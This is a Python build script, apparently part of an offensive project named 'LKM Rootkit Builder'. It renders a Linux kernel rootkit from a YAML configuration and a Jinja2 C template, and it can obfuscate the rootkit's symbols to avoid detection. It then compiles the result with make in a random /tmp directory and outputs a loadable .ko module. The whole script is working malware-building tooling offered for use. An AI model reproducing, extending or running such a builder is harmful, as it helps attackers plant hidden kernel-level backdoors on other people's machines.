#!/usr/bin/env python3

import os
import sys
import yaml
import shutil
import argparse

from jinja2 import Template

from obfuscator import Obfuscator

obfuscated = False

ob = Obfuscator()

parser = argparse.ArgumentParser(description='Generate rootkit from yaml prescription')
parser.add_argument('-c', '--config', type=str, default="config.yml", help='Yaml prescription file')
parser.add_argument('-o', '--obfuscate', type=str, help='Enable rootkit symbols obfuscation', action='store', const='true', nargs='?')
args = parser.parse_args()

print("""
 ████   ████████   ████████  ██████████ █████       ███   █████
░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███
 ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████
 ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░
 ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███
 ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███
 █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████
░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░
LKM Rootkit Builder
""")

with open(args.config, 'r') as file:
    rootkit = yaml.safe_load(file)

with open("rootkit_files/rootkit_template.j2", "r") as f:
    template = f.read()

tm = Template(template)
msg = tm.render(rootkit)

build_directory = ob.random_string()
original_directory = os.getcwd()

os.system("cp -r . /tmp/"+build_directory)
os.chdir("/tmp/"+build_directory)

with open("rootkit/main.c", "w") as f:
    f.write(msg)


os.system("mv rootkit_files/Makefile .")

if args.obfuscate:
    ob.start()
    obfuscated = True

os.system("make")

rootkit_name = "project"
if obfuscated:
    rootkit_name = ob.get_name()

os.system("mv /tmp/"+build_directory+"/"+rootkit_name+".ko "+original_directory)
shutil.rmtree("/tmp/"+build_directory)

print("\n=== File "+original_directory+"/"+rootkit_name+".ko created ===\n")
